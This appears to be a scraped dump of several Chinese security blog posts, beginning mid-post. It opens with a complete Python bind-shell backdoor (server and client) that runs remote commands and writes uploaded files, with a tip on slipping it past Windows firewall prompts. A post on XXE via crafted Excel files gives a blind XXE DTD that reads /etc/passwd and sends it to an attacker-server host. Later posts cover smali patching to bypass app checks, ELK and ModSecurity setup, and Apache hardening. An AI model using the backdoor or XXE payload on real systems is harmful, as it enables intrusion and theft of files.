print &quot;[*] Listening on %s:%d&quot; %(socket.gethostname(),ips) while True: data, addr &#x3D; server.accept() buf &#x3D; data.recv(4096) print &quot;[*] recv command &#x3D; %s&quot; %buf if len(buf) !&#x3D; 0: if is_file(buf): rev &#x3D; upload(buf) else: rev &#x3D; run_command(buf) data.send(rev) except: print &quot;Exception!&quot; def is_file(buf): try: if isinstance(eval(buf), dict): return True except: return False def run_command(command): command &#x3D; command.strip() try: p &#x3D; subprocess.Popen(command, stdin&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, shell&#x3D;True) out, err &#x3D; p.communicate() except: out &#x3D; &quot;Fail to execute command!&quot; return out def upload(data): try: path &#x3D; eval(data)[&#39;path&#39;] file &#x3D; eval(data)[&#39;request&#39;] with open(path, &#39;wb&#39;) as f: f.write(file) return &quot;OK&quot; except: return &quot;Fail&quot; if __name__ &#x3D;&#x3D; &quot;__main__&quot;: ip &#x3D; input(&quot;PORT &#x3D; &quot;) server_main(int(ip)) client端： #coding:utf-8 import socket # client # use: # &gt;&gt; command eg:&gt;&gt; whoami # &gt;&gt; upload 要上传的源文件 要上传到的目标地址文件 &gt;&gt; upload d:&#x2F;a.txt e:&#x2F;a.txt def client(ips, data): resp &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: resp.settimeout(10) resp.connect(ips) resp.send(data) out &#x3D; resp.recv(4096) resp.close() except : out &#x3D; &quot;Except Or Time out !&quot; return out def client_send(target, port): while True: data &#x3D; raw_input(&quot;&gt;&gt; &quot;) if &#39;upload&#39; not in data: out &#x3D; client((target,port),data) print &quot;[*] Command Out&#x3D; %s&quot; % out else: upload((target,port),data) def upload(ips,data): file &#x3D; data.split(&#39; &#39;) list_a &#x3D; &#123;&#125; name &#x3D; file[1].replace(&#39;\\\\&#39;,&#39;&#x2F;&#39;) list_a[&#39;path&#39;] &#x3D; file[2] request &#x3D; &#39;&#39; with open(name,&#39;rb&#39;) as f: for i in f.readlines(): request+&#x3D;i list_a[&#39;request&#39;] &#x3D; request out &#x3D; client(ips, str(list_a)) if &quot;OK&quot; in out: print &quot;[*] File Write Success !&quot; else: print &quot;[*] File Write Fail !&quot; if __name__ &#x3D;&#x3D; &quot;__main__&quot;: ip &#x3D; raw_input(&quot;IP:PORT &#x3D; &quot;) list_a &#x3D; ip.split(&quot;:&quot;) client_send(list_a[0], int(list_a[1])) 代码实现简单，问题在执行的时候是一个正向连接，在服务器开放端口，所以在一定情况下，需要较高的权限。当然这也是后渗透中需要得到的目标。 同时可以利用pyinstaller打包为exe文件在win下运行，不过开放防火墙就需要添加网络允许，但本人尝试中发现，对防火墙端口添加的提示中直接关闭窗口提示，再次运行就可以正常使用。防火墙中也没有启用此运行规则。尚不清楚原因。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"利用EXCEL文件进行XXE文件攻击","slug":"利用EXCEL文件进行XXE文件攻击","date":"2019-01-31T03:38:27.000Z","updated":"2019-01-31T03:40:41.000Z","comments":true,"path":"2019/01/利用EXCEL文件进行XXE文件攻击/","link":"","permalink":"https://misakikata.github.io/2019/01/%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/","excerpt":"","text":"利用EXCEL文件进行XXE文件攻击此问题的来源是：https://mp.weixin.qq.com/s/pthuQFY9sQjxJOOQf91Weg 看到一篇如上的文章，利用EXCEL文档来造成系统的XXE漏洞，而恰好在我们自己的系统上发现了如上的类似漏洞，特此做一个记录文档。 0x01.什么是XML外部实体解释来源：https://www.freebuf.com/articles/web/126788.html 如果你了解XML，你可以把XML理解为一个用来定义数据的东东。因此，两个采用不同技术的系统可以通过XML进行通信和交换数据。 比如，下图就是一个用来描述一个职工的XML文档样本，其中的’name’,’salary’,’address’ 被称为XML的元素。 有些XML文档包含system标识符定义的“实体”，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。 在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取。因此，XML实体被使用的次数越多，越有帮助。 0×02. 什么是XML外部实体攻击？有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上folder/file的内容并呈献给用户。 0×03. 怎么甄别一个XML实体攻击漏洞？最直接的回答就是： 甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。 如何利用EXCEL文档来造成XXE漏洞根据原文档介绍，是对excel文件进行解压缩，来替换其中的[Content-Types].xml或者xl/workbook.xml文件，来造成XXE漏洞。 但根据利用情况的不同，还有可以替换的文件: _rels/.rels 和 xl/worksheets/sheet1.xml等文件。 因此我们自己的系统在文件上传处，也存在一块，类似的XXE利用。 例如此处文件上传处，上传EXCEL文件。 在文件中的[Content-Types].xml中写入测试POC： &lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;xxx.com&#x2F;&quot; &gt;]&gt; &lt;name&gt;&amp;GVI;&lt;&#x2F;name&gt; 于是便可以在我们自己的VPS上监听到来自服务器的请求了。 由于是Blind XXE，所以我们利用在我们自己的VPS上存入如下文件： &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; &lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &#39;http:&#x2F;&#x2F;ATTACKESERVER.com&#x2F;?%file;&#39;&gt;&quot;&gt; %all; 远程利用类似如下： &lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;ATTACKERSERVER.com&#x2F;xxe_file.dtd&quot;&gt; 这时候便可以在监听上收到远程文件的读取。 当然这一块还可以尝试利用已有的脚本，来自动的开启web监听和ftp来传输文件。 https:&#x2F;&#x2F;github.com&#x2F;joernchen&#x2F;xxeserve 其他文章介绍： 1.XXE漏洞利用技巧：从XML到远程代码执行 2.利用OOB XXE盲攻击获取文件系统访问权限","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Android Studio 动态调试","slug":"Android-Studio-动态调试","date":"2019-01-29T08:47:40.000Z","updated":"2019-07-26T09:56:30.000Z","comments":true,"path":"2019/01/Android-Studio-动态调试/","link":"","permalink":"https://misakikata.github.io/2019/01/Android-Studio-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/","excerpt":"","text":"Android Studio 动态调试调试仍然使用我们喜闻乐见的Android Studio，不过使用的是AS3，AS在3.0版本后便不在使用DDMS，调试smali上有点不适应，不过我们仍然可以在配置SDK后，在命令行输入“monitor”来打开DDMS。 apk使用我们自己生成的一个简单的登陆判断界面来做测试。 使用网上的一段登陆代码如下 生成APK后，利用AK反编译为smali代码。 然后用AS打开反编译后的文件夹，当然在利用AS调试smali的时候，需要安装ideasmali插件，具体可以百度插件名即可下载。 调试的时候需要我们进行端口的转发，可以先用DDMS查看一下端口是否是8700（一般默认为8700），因为启动AS后会占有相应的端口，导致无法打开DDMS。 具体使用方式为：打开DDMS。在CMD命令行输入以下内容，其中package为包名。MainActivity是需要调试的activity名，具体看情况修改。 adb shell am start -D -n package&#x2F;.MainActivity 可以看到手机端或者模拟器端已经以调试的方式启动我们相应的程序了。在DDMS中就可以看到一只红色的小蜘蛛了。后面有一个端口默认应该是8700。然后查看进程PID，假设为1980。 adb forward tcp:8700 jdwp:1980 进行端口转发到。转发的时候要先关闭DDMS，不然显示端口被占用。 在使用AS打开我们需要的文件后，如以下内容。 配置远程调试参数，修改端口为8700. 然后在需要的地方设置断点，此处在账户密码的判断处下断点。启动调试，然后就可以看到界面显示到我们断点前的地方了。在模拟器上输入账号密码后，就可以看到断点被执行。 可以看到下面两部分第一部分为为v0赋值为admin，调用String类的equals方法来判断v0参数和p1对象值是否相同，并把结果赋值给v0，一个布尔值。第二部分，判断v0是否为0，等于0跳转到:cond_0处。不等于0则继续，同样为v0赋值一个字符串为12345，调用方法判断是否相同，以下则和上面基本一致。 此时，需要做些什么修改，判断，以后参数变化，可以在下面的variables查看，上图中的参数就是在模拟器中输入的参数显示。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Android逆向逻辑修改入门","slug":"Android逆向逻辑修改入门","date":"2019-01-28T08:28:34.000Z","updated":"2019-07-26T09:56:19.000Z","comments":true,"path":"2019/01/Android逆向逻辑修改入门/","link":"","permalink":"https://misakikata.github.io/2019/01/Android%E9%80%86%E5%90%91%E9%80%BB%E8%BE%91%E4%BF%AE%E6%94%B9%E5%85%A5%E9%97%A8/","excerpt":"","text":"Android 逻辑判断修改使用AS创建一个工程，利用生成工程的初始代码来做。 创建新的layout，在mainactivity中添加新的layout标识。在显示界面的时候加一个判断逻辑，完成后类似如下 if(a&#x3D;&#x3D;1) &#123; setContentView(R.layout.activity_main); &#125; else setContentView(R.layout.activity_main2); &#125; 于是乎，当a为1的时候显示activity_main界面字段。不为1显示activity_main2字段。 一般情况下，对于有些需要内购，或者某些情况才给你显示的界面的时候，界面不是从后端返回而是返回json参数由前端接收显示的时候，可以从前端修改逻辑来绕过判断。 生成smali代码，其中主要部分为下： .method protected onCreate(Landroid&#x2F;os&#x2F;Bundle;)V .registers 4 .param p1, &quot;savedInstanceState&quot; # Landroid&#x2F;os&#x2F;Bundle; .prologue .line 17 invoke-super &#123;p0, p1&#125;, Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AppCompatActivity;-&gt;onCreate(Landroid&#x2F;os&#x2F;Bundle;)V .line 18 const&#x2F;4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const&#x2F;4 v1, 0x1 if-ne v0, v1, :cond_e .line 20 const v1, 0x7f09001c invoke-virtual &#123;p0, v1&#125;, Lcom&#x2F;example&#x2F;user&#x2F;application&#x2F;MainActivity;-&gt;setContentView(I)V .line 24 :goto_d return-void .line 23 :cond_e const v1, 0x7f09001d invoke-virtual &#123;p0, v1&#125;, Lcom&#x2F;example&#x2F;user&#x2F;application&#x2F;MainActivity;-&gt;setContentView(I)V goto :goto_d .end method 整体的代码相当简单轻松，来看判断代码处。 .line 18 const&#x2F;4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const&#x2F;4 v1, 0x1 if-ne v0, v1, :cond_e 其中if-ne，逻辑显示v0不等于v1，跳转到cond_e标签处。 修改一：直接修改if-ne判断形式，修改为if-eq，这样只要不完成正常的逻辑操作，都会跳转到我们想看的界面。 修改二：由于判断处是根据参数a的值和1做对比，所以我们直接对a重赋值(以上的a赋值可以粗略的看为是请求获取的值)。 .line 18 const&#x2F;4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const&#x2F;4 v1, 0x1 const&#x2F;4 v0, 0x1 if-ne v0, v1, :cond_e 修改三：利用强制跳转，在需要去查看，或者执行下去的地方添加标签，goto_1，然后在判断执行前强制跳转进去。 const&#x2F;4 v1, 0x1 goto :goto_1 if-ne v0, v1, :cond_0 .line 20 :goto_1 const v1, 0x7f09001c","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Android 逆向Smali语言初识","slug":"Android-逆向Smali语言初识","date":"2019-01-22T07:55:56.000Z","updated":"2019-07-26T09:56:22.000Z","comments":true,"path":"2019/01/Android-逆向Smali语言初识/","link":"","permalink":"https://misakikata.github.io/2019/01/Android-%E9%80%86%E5%90%91Smali%E8%AF%AD%E8%A8%80%E5%88%9D%E8%AF%86/","excerpt":"","text":"Android 逆向Smali语言初识​ Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。 函数语法​ Smali 语法规范与格式Smali 是对 Dalvik 虚拟机字节码的一种解释，虽然不是官方标准语言，但所有语句都遵循一套语法规范。要了解 smali 语法规范，可以先从了解 Dalvik 虚拟机字节码的指令格式开始。3.1 Dalvik 虚拟机字节码指令格式在 Android 4.0 源码 Dalvik/docs 目录下提供了一份文档 instruction-formats.html，里面详细列举了 Dalvik 虚拟机字节码指令的所有格式。 Dalvik 虚拟机字节码的类型、方法和字段的表示方法3.2.1 类型Dalvik 字节码有两种类型，基本类型和引用类型。对象和数组是引用类型，其它都是基本类型。 Dalvik 字节码类型描述符 ​ 描述符 类型 V void，只能用于返回值类型 Z boolean B byte S short C charI intJ long（64 位） F floatD double（64 位） L Java 类类型 [ 数组类型 常见的代码含义： #表示当前代码在源java文件中的行数。 .line .line 34 #表示来自公共方法methodAReturn返回值是一个对象com.bolex.AA method .method public methodAReturn(Lcom&#x2F;bolex&#x2F;AA;Lcom&#x2F;bolex&#x2F;AA;)Lcom&#x2F;bolex&#x2F;AA; #表示该函数上需要使用3个寄存器 registers .registers 3 #表示接收两个入参都是AA对象，并标记寄存器p1和p2 param .param p1, &quot;mAA&quot; # Lcom&#x2F;bolex&#x2F;AA; .param p2, &quot;sAA&quot; # Lcom&#x2F;bolex&#x2F;AA; #表示函数内执行的起始标记 .prologue .prologue #表示 返回寄存器上p1对象 return-object return-object p1 #表示函数结束标记 .end method #创建一个AA对象 new-instance new-instance v0, Lcom&#x2F;bolex&#x2F;AA; #表示使用无参构造方法直接调用 invoke-direct invoke-direct &#123;v0&#125;, Lcom&#x2F;bolex&#x2F;AA;-&gt;&lt;init&gt;()V #表示为虚拟方法 invoke-virtual #数组操作指令 #new-array构造指定类型I也就是int类型并且把值赋给v0 # v0&#x3D;new int[8]; new-array v0,v0,[ I #array-length 获取给定v0寄存器中数组的长度并将值赋给v1寄存器，数组长度就是数组的个数。v1&#x3D;v0,也就是说v1&#x3D;8 array-length v1,v0 # 方法调用指令 #new-instance v1,... 构造一个指定类型对象的新实例，并将对象引用赋值给v1寄存器。 #L表示java类型中的任何类， # StringBuilder对象是动态对象，允许扩充它所封装的字符串中字符的数量，但是您可以为它可容纳的最大字符数指定一个值。相当于是一个string的升级版。 new-instance v1,Ljava&#x2F;lang&#x2F;StringBuilder; # 方法调用指令 #&lt;init&gt;:在实例创建出来的时候调用，包括调用new操作符； new-direct v1,Ljava&#x2F;lang&#x2F;StringBuilder;-&gt;&lt;init&gt;( )v # 跳转指令 if (v0!&#x3D;0) #if-nez 的意思就是 not equal zero 如果v0不等于0，那么就继续向下执行，如果等于0就跳转到标号名为cond_0的位置。 if-nez v0, : cond_0 # goto的含义就是强行跳转到标号名为goto_0的地方 goto :goto_0 #标号cond_0 ：cond_0 # 数据转换指令 #把int型变量转变为float变量 int-to-float v2,v2 # 数据运算指令 # 相当于 v2+&#x3D;v2，第一个v2是寄存器，第二个和第三个是数据 add-float v2,v2,v2 Java编译dex文件以下用常见的hello world来表示smali语法结构。 public class firedt &#123; public static void main(String[] args)&#123; System.out.println(&quot;hello world&quot;); &#125; &#125; 在AS中打开代码，安装java2smali插件后，在build-&gt;compile to smali编译为smali代码。 编译完成后的代码为以下，并对关键代码进行注释含义： .class public Lfiredt; #定义一个firedt类 .super Ljava&#x2F;lang&#x2F;Object; #继承object类 .source &quot;firedt.java&quot; #由firedt.java编译来 # direct methods .method public constructor &lt;init&gt;()V .registers 1 #注册一个寄存器 .prologue #代码开始 .line 1 #第一行 invoke-direct &#123;p0&#125;, Ljava&#x2F;lang&#x2F;Object;-&gt;&lt;init&gt;()V return-void .end method .method public static main([Ljava&#x2F;lang&#x2F;String;)V #说明一个main的静态方法，类型为void .registers 3 .prologue .line 3 sget-object v0, Ljava&#x2F;lang&#x2F;System;-&gt;out:Ljava&#x2F;io&#x2F;PrintStream; #获取变量对象保存到v0 const-string v1, &quot;hello world&quot; #赋值一个字符串v1&#x3D;hello world invoke-virtual &#123;v0, v1&#125;, Ljava&#x2F;io&#x2F;PrintStream;-&gt;println(Ljava&#x2F;lang&#x2F;String;)V #调用printstream的println方法把v0赋值v1 .line 4 return-void .end method #方法结束，一个method对应一个end method 参考资料： smali语法中文参考文档 逆向之Smali入门学习","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"ELK搭建使用","slug":"ELK搭建使用","date":"2018-11-04T09:05:12.000Z","updated":"2018-11-04T09:34:33.000Z","comments":true,"path":"2018/11/ELK搭建使用/","link":"","permalink":"https://misakikata.github.io/2018/11/ELK%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8/","excerpt":"","text":"ELK日志分析系统搭建使用ELK是三个开源软件的缩写，分别表示：Elasticsearch , Logstash, Kibana , 它们都是开源软件。但现在新增了一个FileBeat，它是一个轻量级的日志收集处理工具(Agent)，Filebeat占用资源少，适合于在各个服务器上搜集日志后传输给Logstash，但此次并不添加filebeat，仍然以es、logstash、kibana做搭建使用。 使用环境：centos6.5 192.168.253.138作为日志来源服务器 apache ​ centos7 192.168.253.139 作为显示终端服务器 安装jdk首先安装Java，版本1.8以上。 安装Elasticsearch下载elasticsearch ， wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.4.2.tar.gz 修改解压文件中的config/elasticsearch.yml 文件 # 这里指定的是集群名称，需要修改为对应的，开启了自发现功能后，ES会按照此集群名称进行集群发现 cluster.name: es_cluster node.name: es_cluster_1 # 数据目录 path.data: &#x2F;data&#x2F;data # log 目录 path.logs: &#x2F;data&#x2F;logs # 修改一下ES的监听地址，这样别的机器也可以访问 network.host: 192.168.253.139 # 默认的端口号 http.port: 9200 discovery.zen.ping.unicast.hosts: [&quot;192.168.253.138&quot;, &quot;192.168.253.139&quot;] 在使用中可能会因为系统内存等问题导致启动失败，所以可以预调整系统参数。 设置内核参数 vi &#x2F;etc&#x2F;sysctl.conf # 增加以下参数 vm.max_map_count&#x3D;655360 执行以下命令，确保生效配置生效： sysctl -p 设置资源参数 vi &#x2F;etc&#x2F;security&#x2F;limits.conf # 修改 * soft nofile 65536 * hard nofile 131072 * soft nproc 65536 * hard nproc 131072 设置用户资源参数 vi &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;20-nproc.conf # 设置elk用户参数 elk soft nproc 65536 启动elk需要非root用户，所以创建elk用户。 useradd elk #创建用户elk groupadd elk #创建组elk useradd elk -g elk #将用户添加到组 mkdir -pv &#x2F;data&#x2F;&#123;data,logs&#125; # 创建数据和日志目录 # 修改文件所有者 chown -R elk:elk &#x2F;data&#x2F; chown -R elk:elk &#x2F;etc&#x2F;elasticsearch&#x2F; 切换到elk用户，启动服务 启动文件 &#x2F;etc&#x2F;elasticsearch&#x2F;bin&#x2F;elasticsearch 服务器要关闭防火墙 systemctl stop firewalld.service 这时候可以看到log输出，节点正常启动. 用浏览器访问，同时可以正常使用 安装Logstash下载解压 wget https://artifacts.elastic.co/downloads/logstash/logstash-6.4.2.tar.gz 在解压后目录执行 &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;bin&#x2F;logstash -e &#39;input &#123; stdin &#123; &#125; &#125; output &#123; stdout &#123;&#125; &#125;&#39; 在命令行输入什么内容讲原样输出，比如： 显示正常以后再去修改配置文件，需要自己添加，创建如下内容文件。 cat logstash-simple.conf input&#123; file &#123; path &#x3D;&gt; &quot;&#x2F;var&#x2F;log&#x2F;httpd&#x2F;*&quot; start_position &#x3D;&gt; beginning &#125; &#125; output &#123; stdout &#123; codec&#x3D;&gt; rubydebug &#125; elasticsearch &#123; hosts &#x3D;&gt; &quot;192.168.253.132:9200&quot; protocol &#x3D;&gt; &quot;http&quot; index &#x3D;&gt; &quot;logstash-%&#123;+YYYY-MM&#125;&quot; &#125; &#125; 开启服务，执行如下命令： &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;bin&#x2F;logstash -f &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;logstash-simple.conf 我们可以查看 ES 是否接收到了数据： Kibana的安装wget https://artifacts.elastic.co/downloads/kibana/kibana-6.4.2-linux-x86_64.tar.gz 编辑kibana.yml配置文件 vi &#x2F;usr&#x2F;share&#x2F;kibana&#x2F;config&#x2F;kibana.yml 修改以下参数： server.port: 5601 #开启默认端口5601，本文修改默认端口为5602 server.host: “192.168.253.139” #站点地址 elasticsearch.url: http:&#x2F;&#x2F;192.168.253.139:9200 #指向elasticsearch服务的ip地址 kibana.index: “.kibana” 启动 执行以下命令启动： &#x2F;usr&#x2F;share&#x2F;kibana&#x2F;bin&#x2F;kibana 测试浏览器访问 访问：http://192.168.253.139:5602 正常启动后，需要配置索引，设置logstash-* ，添加索引和Available fields后，点击Discover就可以看到logstash传输过来的日志信息。 然后可以手动添加fields参数或者创建图表。 yum 安装以上安装方式为下载配置安装，可以使用yum安装。 # 导入私钥 rpm --import https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;GPG-KEY-elasticsearch # 添加yum源 vim &#x2F;etc&#x2F;yum.repos.d&#x2F;es.repo yum源内容： [elasticsearch-6.x] name&#x3D;Elasticsearch repository for 6.x packages baseurl&#x3D;https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;packages&#x2F;6.x&#x2F;yum gpgcheck&#x3D;1 gpgkey&#x3D;https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;GPG-KEY-elasticsearch enabled&#x3D;1 autorefresh&#x3D;1 type&#x3D;rpm-md 执行安装： # 安装java + ELK yum install java-1.8.0-openjdk.x86_64 elasticsearch.noarch kibana.x86_64 logstash.noarch -y # 修改配置文件 vi &#x2F;etc&#x2F;logstash&#x2F;logstash.yml vi &#x2F;etc&#x2F;elasticsearch&#x2F;elasticsearch.yml vi &#x2F;etc&#x2F;kibana&#x2F;kibana.yml # 启动服务 systemctl start logstash.service elasticsearch.service kibana.service 配置文件和上文相同修改，如若无法访问，关闭防火墙 。 参考链接： https://blog.csdn.net/KingBoyWorld/article/details/78555120 https://www.cnblogs.com/yuhuLin/p/7018858.html https://www.elastic.co/products","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Apache中ModSecurity安装配置","slug":"Apache中ModSecurity安装配置","date":"2018-10-22T07:54:13.000Z","updated":"2018-10-22T10:28:19.000Z","comments":true,"path":"2018/10/Apache中ModSecurity安装配置/","link":"","permalink":"https://misakikata.github.io/2018/10/Apache%E4%B8%ADModSecurity%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","excerpt":"","text":"环境为centos 6.5 apache2.2 modsecurity2.9.2 安装mod_security的依赖 yum install gcc make httpd-devel libxml2 pcre-devel libxml2-devel curl-devel git 下载最新稳定的mod_security源代码 wget https:&#x2F;&#x2F;www.modsecurity.org&#x2F;tarball&#x2F;2.9.2&#x2F;modsecurity-2.9.2.tar.gz 安装步骤： tar xzf modsecurity-2.9.2.tar.gz cd modsecurity-2.9.2 .&#x2F;configure make install cp modsecurity.conf-recommended &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;modsecurity.conf cp unicode.mapping &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F; 安装完成后调整配置，修改httpd.conf LoadModule security2_module modules&#x2F;mod_security2.so 如下配置，需要根据目录位置修改，因为modsecurity安装在/etc/httpd目录，配置文件在conf文件，所以不在写入以下配置。 &lt;IfModule security2_module&gt; Include conf.d&#x2F;modsecurity.conf &lt;&#x2F;IfModule&gt; 配置完成后下载owasp的规则： cd &#x2F;etc&#x2F;httpd git clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;owasp-modsecurity-crs.git 或 wget https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;owasp-modsecurity-crs&#x2F;archive&#x2F;v3.1.0-rc1.tar.gz mv owasp-modsecurity-crs modsecurity-crs cd modsecurity-crs cp crs-setup.conf.example modsecurity-crs-config.conf 在httpd.conf中修改 Include modsecurity-crs&#x2F;modsecurity-crs-config.conf Include modsecurity-crs&#x2F;rules&#x2F;*.conf 修改完成后重启服务： service httpd restart 完成以后尝试SQL注入攻击，可以看到被拦截的页面。 在apache日志中查看error信息： 从上图可以看到拦截的类型和规则id，还有规则的目录文件。去对应的规则处查看规则文件，可以看到如下的规则匹配。 关于modsecurity的配置，根据各自设置的地址，比如当前地址为/etc/httpd/conf.d中。 SecRuleEngine On 设置为mod是否开启，默认设置为Detection Only，作用是只检测。Off则是关闭mod。 SecRequestBodyAccess On 检查请求体，默认开启，可以选择On或Off。 SecAuditEngine RelevantOnlySecAuditLogRelevantStatus “^(?:5|4(?!04))” SecAuditLogParts ABIJDEFHZ SecAuditLogType SerialSecAuditLog /var/log/modsec_audit.log 记录日志审计内容，文件地址等，如下图所示，ABCE等，修改SecAuditLogParts参数，可以记录不同的日志部分。对调试waf，修改配置策略很有用。 然后，如果需要修改其他配置项，比如403错误页面，直接再httpd.conf中修改403错误页面即可。 参考链接： http://www.vue5.com/centos/23142.html https://www.cnblogs.com/xiachj/p/4112194.html","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Apache和Nginx安全配置","slug":"Apache和Nginx安全配置","date":"2018-10-09T08:21:20.000Z","updated":"2018-10-09T14:38:34.000Z","comments":true,"path":"2018/10/Apache和Nginx安全配置/","link":"","permalink":"https://misakikata.github.io/2018/10/Apache%E5%92%8CNginx%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/","excerpt":"","text":"apache安全配置apache运行原理Apache是基于模块化设计的，它的核心代码并不多，大多数的功能都被分散到各个模块中，各个模块在系统启动的时候按需载入。从配置文件中可以看到加载的各个模块。 apache在启动阶段采用root权限来获取更多的资源使用权限，这个时候会加载配置文件，模块，资源文件等，在下一个运行阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root完成启动。分11个阶段处理用户的请求。 apache的两种工作模式Apache通过MPM(多路处理模块)来使用操作系统的资源，对进程和线程池进行管理。Apache为了能够获得更好的运行性能，针对不同的平台 (Unix/Linux、Window)提供了不同的MPM，用户可以根据实际情况进行选择，其中最常使用的MPM有 prefork和worker两种。 prefork 一个单独的控制进程(父进程)负责产生子进程，这些子进程用于监听请求并作出应答。Apache总是试图保持一些备用的 (spare)或是空闲的子进程用于迎接即将到来的请求。这样客户端就无需在得到服务前等候子进程的产生。在Unix系统中，父进程通常以root身份运行以便邦定80端口，而 Apache产生的子进程通常以一个低特权的用户运行。User和Group指令用于配置子进程的低特权用户。 worker 每个进程能够拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建立。每个子进程能够建立 ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。Apache总是试图维持一个备 用(spare)或是空闲的服务线程池。这样，客户端无须等待新线程或新进程的建立即可得到处理。在Unix中，为了能够绑定80端口，父进程一般都是以 root身份启动，随后，Apache以较低权限的用户建立子进程和线程。User和Group指令用于配置Apache子进程的权限。 apache 在centos下配置apache配置文件，默认文件在/etc/httpd/conf/httpd.conf路径下 那么简单理解一下，配置参数的含义和使用，Allow和Deny可以用于apache的conf文件或者.htaccess文件中（配合Directory, Location, Files等），用来控制目录和文件的访问授权。所以，最常用的是：Order Deny,AllowAllow from All 注意“Deny,Allow”中间只有一个逗号，也只能有一个逗号，有空格都会出错；单词的大小写不限。上面设定的含义是先设定“先检查禁止设定，没有禁止的全部允许”，而第二句没有Deny，也就是没有禁止访问的设定，直接就是允许所有访问了。 但是如果想限制IP访问，如下写 Order Deny,Allow Deny from 192.168.1.1 Allow from all 这时候限制不起作用，Order取规则为最后一个Allow规则，首先限制IP访问，但是会继续查看Allow规定指定的信息，IP又在all中，所以限制不起作用。所以可以如下写： Order Deny,Allow Deny from 192.168.1.1 或者 Order Allow,Deny Allow from all Deny from 192.168.1.1 比如：如下的常用配置 1、在配置文件开始部分和下部有两个配置项，用来隐藏banner信息： ServerTokens OS 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称）ServerSignature On 修改为：ServerSignature Off （不回显apache版本信息） 2、apache在一些系统的默认配置中，开启目录浏览，所以可以使用以下关闭设置。 将Options Indexes FollowSymLinks 改为 Options -Indexes FollowSymLinks 3、取消部分目录的php执行权限 &lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&quot;&gt; &lt;FilesMatch &quot;\\.(?i:php|php3|php5)$&quot;&gt; Deny from all &lt;&#x2F;FilesMatch&gt; &lt;&#x2F;Directory&gt; &#x2F;&#x2F;在upload目录下，尽可能多匹配后缀php|php3|php5的文件，不分大小写。 还可以在主机配置文件中增加php_flag engine off指令即可，配置如下： Options FollowSymLinks AllowOverride None Order allow,deny Allow from all php_flag engine off 5、配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。 &lt;Directory 